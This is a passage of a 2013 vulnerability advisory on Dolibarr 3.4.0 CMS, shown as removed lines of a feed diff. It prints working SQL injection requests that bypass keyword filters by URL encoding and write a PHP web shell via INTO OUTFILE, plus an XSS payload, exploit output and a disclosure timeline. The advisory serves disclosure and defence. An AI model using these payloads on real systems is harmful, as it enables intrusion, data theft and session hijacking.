-</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
-</span><span class='line'>    }
-</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
-</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
-</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
-</span><span class='line'>    return $sql_inj;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It&rsquo;s quite clear that the blacklisting approach is inefficient; particularly the cross-site scripting protection.  The SQLi blacklisting doesn&rsquo;t restrict INTO OUTFILE/DUMPFILE, meaning with a well-tuned SQL injection we can throw a web shell onto the box.</p>
-
-<p>Let&rsquo;s take a look at one such vulnerable query <code>contact/fiche.php</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>if ($action == 'confirm_delete' && $confirm == 'yes' && $user-&gt;rights-&gt;societe-&gt;contact-&gt;supprimer)
-</span><span class='line'>    {
-</span><span class='line'>        $result=$object-&gt;fetch($_GET["id"]);</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>contact/class/contact.class.php</code></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id, $user=0)
-</span><span class='line'>    {
-</span><span class='line'>        global $langs;
-</span><span class='line'>
-</span><span class='line'>        $langs-&gt;load("companies");
-</span><span class='line'>
-</span><span class='line'>        $sql = "SELECT c.rowid, c.fk_soc, c.civilite as civilite_id, c.lastname, c.firstname,";
-</span><span class='line'>        $sql.= " c.address, c.zip, c.town,";
-</span><span class='line'>        $sql.= " c.fk_pays as country_id,";
-</span><span class='line'>        $sql.= " c.fk_departement,";
-</span><span class='line'>        $sql.= " c.birthday,";
-</span><span class='line'>        $sql.= " c.poste, c.phone, c.phone_perso, c.phone_mobile, c.fax, c.email, c.jabberid,";
-</span><span class='line'>        $sql.= " c.priv, c.note_private, c.note_public, c.default_lang, c.no_email, c.canvas,";
-</span><span class='line'>        $sql.= " c.import_key,";
-</span><span class='line'>        $sql.= " p.libelle as country, p.code as country_code,";
-</span><span class='line'>        $sql.= " d.nom as state, d.code_departement as state_code,";
-</span><span class='line'>        $sql.= " u.rowid as user_id, u.login as user_login,";
-</span><span class='line'>        $sql.= " s.nom as socname, s.address as socaddress, s.zip as soccp, s.town as soccity, s.default_lang as socdefault_lang";
-</span><span class='line'>        $sql.= " FROM ".MAIN_DB_PREFIX."socpeople as c";
-</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_pays as p ON c.fk_pays = p.rowid";
-</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_departements as d ON c.fk_departement = d.rowid";
-</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."user as u ON c.rowid = u.fk_socpeople";
-</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."societe as s ON c.fk_soc = s.rowid";
-</span><span class='line'>        $sql.= " WHERE c.rowid = ". $id;
-</span><span class='line'>
-</span><span class='line'>        dol_syslog(get_class($this)."::fetch sql=".$sql);
-</span><span class='line'>        $resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Our vulnerable parameter <code>id</code> is sanitized only by the previously described functions.  There are now two main options; dump information from the database, or drop a web shell onto the host.  The latter is the best case and the former is, usually, a good consolatory prize.  However, in this case, the database is ripe with information, specifically:</p>
-
-<p><img class="center" src="http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG"></p>
-
-<p>Yeah, that&rsquo;s your plaintext password stored right next to the hashed version.  Dumping the database just got a whole lot more interesting.</p>
-
-<p>Our attention now turns to evading the filters listed above.  For obtaining a shell, the only evasion we need to consider is UNION SELECT, as INTO OUTFILE/DUMPFILE is not filtered.  After a bit of deliberation and source code analysis, it was determined that the filters were trivially bypassed by URL encoding SQL keywords.  The following query will drop a web shell at the given location:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/dolibarr-3.4.0/htdocs/contact/fiche.php?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php'&action=confirm_delete&confirm=yes HTTP/1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Which results in:</p>
-
-<p><img class="center" src="http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG" title="" ></p>
-
-<p>The documents folder is a perfect candidate for our web shell as, during installation of the CMS, this folder must be user-created and writable by the install, giving us a guaranteed and predictable location for the web shell.</p>
-
-<p>This vulnerability has been detected in <code>contact.class.php</code> in four different functions: fetch, update, delete, and create.</p>
-
-<p>We now take another look at the XSS filtering function:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>  // For XSS Injection done by adding javascript with script
-</span><span class='line'>    // This is all cases a browser consider text is javascript:
-</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
-</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
-</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
-</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
-</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
-</span><span class='line'>    if ($type == 1)
-</span><span class='line'>    {
-</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
-</span><span class='line'>    }
-</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
-</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
-</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
-</span><span class='line'>    return $sql_inj;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As we can see, this is quite weak, and we can get by with a very simple injection, <code>&lt;body onload=alert(1)&gt;</code>.  Injecting this into the last name of a contact results in success:</p>
-
-<p><img class="center" src="http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG"></p>
-
-<p>With this we can syphon off session IDs and completely hijack sessions.  Any field that&rsquo;s reflected back to the user is vulnerable, and considering this is a CMS, that&rsquo;s a lot.</p>
-
-<p>All of the discussed vulnerabilities have, thus far, been post-auth.  One remotely exploitable pre-auth vulnerability was discovered in <code>public/members/public_list.php</code> (configured with <code>define("NOLOGIN",1)</code>), meaning it does not require auth):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$sortfield = GETPOST("sortfield",'alpha');
-</span><span class='line'>$sortorder = GETPOST("sortorder",'alpha');
-</span><span class='line'>$page = GETPOST("page",'int');
-</span><span class='line'>if ($page == -1) { $page = 0; }
-</span><span class='line'>$offset = $conf-&gt;liste_limit * $page;
-</span><span class='line'>$pageprev = $page - 1;
-</span><span class='line'>$pagenext = $page + 1;
-</span><span class='line'>
-</span><span class='line'>$filter=GETPOST('filter');
-</span><span class='line'>$statut=GETPOST('statut');
-</span><span class='line'>
-</span><span class='line'>if (! $sortorder) {  $sortorder="ASC"; }
-</span><span class='line'>if (! $sortfield) {  $sortfield="nom"; }
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>/*
-</span><span class='line'> * View
-</span><span class='line'> */
-</span><span class='line'>
-</span><span class='line'>llxHeaderVierge($langs-&gt;trans("ListOfValidatedPublicMembers"));
-</span><span class='line'>
-</span><span class='line'>$sql = "SELECT rowid, firstname, lastname, societe, zip, town, email, birth, photo";
-</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."adherent";
-</span><span class='line'>$sql.= " WHERE entity = ".$entity;
-</span><span class='line'>$sql.= " AND statut = 1";
-</span><span class='line'>$sql.= " AND public = 1";
-</span><span class='line'>$sql.= $db-&gt;order($sortfield,$sortorder);
-</span><span class='line'>$sql.= $db-&gt;plimit($conf-&gt;liste_limit+1, $offset);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And <code>core/db/msqli.class.php</code></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> function order($sortfield=0,$sortorder=0)
-</span><span class='line'>    {
-</span><span class='line'>        if ($sortfield)
-</span><span class='line'>        {
-</span><span class='line'>            $return='';
-</span><span class='line'>            $fields=explode(',',$sortfield);
-</span><span class='line'>            foreach($fields as $val)
-</span><span class='line'>            {
-</span><span class='line'>                if (! $return) $return.=' ORDER BY ';
-</span><span class='line'>                else $return.=',';
-</span><span class='line'>
-</span><span class='line'>                $return.=preg_replace('/[^0-9a-z_\.]/i','',$val);
-</span><span class='line'>                if ($sortorder) $return.=' '.preg_replace('/[^0-9a-z]/i','',$sortorder);
-</span><span class='line'>            }
-</span><span class='line'>            return $return;
-</span><span class='line'>        }
-</span><span class='line'>        else
-</span><span class='line'>        {
-</span><span class='line'>            return '';
-</span><span class='line'>        }
-</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And navigation to the page results in:</p>
-
-<p><img class="center" src="http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG"></p>
-
-<p>As shown, the <code>sortfield</code> and <code>sortorder</code> parameters are inadequately sanitized, but exploitation may be a bit tricky.  The order function strips everything that isn&rsquo;t a number, lowercase alphanumeric letter, or one of three symbols.  Instead, why don&rsquo;t we exploit yet <em>another</em> preauth vulnerability in <code>opensurvey/public/exportcsv.php</code></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$action=GETPOST('action');
-</span><span class='line'>$numsondage = $numsondageadmin = '';
-</span><span class='line'>
-</span><span class='line'>if (GETPOST('sondage'))
-</span><span class='line'>{
-</span><span class='line'>    if (strlen(GETPOST('sondage')) == 24)    // recuperation du numero de sondage admin (24 car.) dans l'URL
-</span><span class='line'>    {
-</span><span class='line'>        $numsondageadmin=GETPOST("sondage",'alpha');
-</span><span class='line'>        $numsondage=substr($numsondageadmin, 0, 16);
-</span><span class='line'>    }
-</span><span class='line'>    else
-</span><span class='line'>    {
-</span><span class='line'>        $numsondageadmin='';
-</span><span class='line'>        $numsondage=GETPOST("sondage",'alpha');
-</span><span class='line'>    }
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>$object=new Opensurveysondage($db);
-</span><span class='line'>$result=$object-&gt;fetch(0,$numsondage);
-</span><span class='line'>if ($result &lt;= 0) dol_print_error('','Failed to get survey id '.$numsondage);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And <code>opensurvey/class/opensurveysondage.class.php</code></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id,$numsurvey='')
-</span><span class='line'>{
-</span><span class='line'>global $langs;
-</span><span class='line'>
-</span><span class='line'>$sql = "SELECT";
-</span><span class='line'>//$sql.= " t.rowid,";
-</span><span class='line'>$sql.= " t.id_sondage,";
-</span><span class='line'>$sql.= " t.commentaires,";
-</span><span class='line'>$sql.= " t.mail_admin,";
-</span><span class='line'>$sql.= " t.nom_admin,";
-</span><span class='line'>$sql.= " t.titre,";
-</span><span class='line'>$sql.= " t.id_sondage_admin,";
-</span><span class='line'>$sql.= " t.date_fin,";
-</span><span class='line'>$sql.= " t.format,";
-</span><span class='line'>$sql.= " t.mailsonde,";
-</span><span class='line'>$sql.= " t.survey_link_visible,";
-</span><span class='line'>$sql.= " t.canedit,";
-</span><span class='line'>$sql.= " t.sujet,";
-</span><span class='line'>$sql.= " t.tms";
-</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."opensurvey_sondage as t";
-</span><span class='line'>if ($id &gt; 0) $sql.= " WHERE t.rowid = ".$id;
-</span><span class='line'>else if (strlen($numsurvey) == 16) $sql.= " WHERE t.id_sondage = '".$numsurvey."'";
-</span><span class='line'>else $sql.= " WHERE t.id_sondage_admin = '".$numsurvey."'";
-</span><span class='line'>
-</span><span class='line'>dol_syslog(get_class($this)."::fetch sql=".$sql, LOG_DEBUG);
-</span><span class='line'>$resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As the bolded path shows, the query argument <code>numsurvey</code> is directly controllable by an unauthenticated user, leading to the same type of SQL vulnerability shown earlier.  This can be exploited with the following:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET /dolibarr/htdocs/opensurvey/public/exportcsv.php?sondage='%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php';%20--%20-%20 HTTP/1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using the same URL encoding trick from before, we can bypass the blacklisting and inject directly into the vulnerable query.  Exploit code for this is included at the bottom of the post:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python dolibarr_34_sploit.py -i 192.168.1.100 -p /dolibarr-3.4.0 -w /var/www/dolibarr-3.4.0/documents
-</span><span class='line'>[!] Dropping web shell on 192.168.1.100...
-</span><span class='line'>[!] Shell dropped.  http://192.168.1.100/documents/o4oct.php?cmd=ls
-</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="center" src="http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG"></p>
-
-<p>Fortunately, for users running DoliWamp,  Dolibarr + WAMP package on Windows, the default user that the database runs with is not allowed to write files.  They are still vulnerable, however, to database corruption and traversal (i.e. drop table subqueries, etc.).</p>
-
-<h3>Timeline</h3>
-
-
-<ul>
-<li>10/06/2013 &ndash; Vendor notified of remotely exploitable vulnerabilities</li>
-<li>10/07/2013 &ndash; Vendor acknowledges vulnerability, no timeline provided</li>
-<li>10/11/2013 &ndash; Vendor states fix will be in the 3.4.1 release within the month</li>
-<li>10/14/2013 &ndash; 3.4.1 released with patch.  This advisory released</li>
-</ul>
-
-
-<p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
 ]]></content>
   </entry>
   
